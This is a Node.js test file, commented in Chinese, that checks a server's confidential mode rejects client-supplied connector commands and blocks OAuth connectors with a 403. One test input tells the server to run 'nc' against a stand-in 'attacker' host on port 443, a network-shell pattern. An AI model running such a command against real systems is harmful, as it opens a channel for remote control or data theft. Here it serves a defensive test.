// 机密档连接器治理姿态(切片 #4 可做部分)——确认连接器攻击面已被锁死
// ---------------------------------------------------------------------------
// 机密档下连接器的三道闸(切片 1 + 既有 allowlist)组合起来即"签名/白名单治理":
//   ① 启动期 MCP(含 MASE)全丢;② OAuth 连接器整面 403;③ /connectors/connect 只接受
//   host 内置(客户端命令一律拒绝),而唯一可连的内置是本地 filesystem(无对外出站)。
import assert from 'node:assert/strict';
import test from 'node:test';
import { createServer } from '../src/server.js';
import { noopKimiChatRunner } from './helpers/agent-stream.js';
import { bind, close, jsonRequest, tempRoot } from './helpers/host-http.js';

test('confidential mode: connector attack surface is locked (client commands rejected, OAuth 403)', async () => {
  const prev = process.env.KCW_CONFIDENTIAL;
  process.env.KCW_CONFIDENTIAL = '1';
  const root = tempRoot('kcw-conf-conn-');
  const server = createServer({ requireAuth: false, trustedRoot: root, enableScheduler: false, modelChatRunner: noopKimiChatRunner });
  const base = await bind(server);
  try {
    // 客户端指定命令 / 未知连接器 → 拒绝(只允许 host 内置)
    const bogus = await jsonRequest(base, '/api/connectors/connect', { method: 'POST', body: { id: 'evil-remote', command: 'nc', args: ['attacker', '443'] } });
    assert.ok(bogus.status === 400 || bogus.status === 503, 'client-supplied connector must be rejected');
    // OAuth 连接器面整面禁用
    const oauth = await jsonRequest(base, '/api/connectors/oauth/status?provider=github');
    assert.equal(oauth.status, 403);
  } finally {
    await close(server);
    if (prev === undefined) delete process.env.KCW_CONFIDENTIAL; else process.env.KCW_CONFIDENTIAL = prev;
  }
});
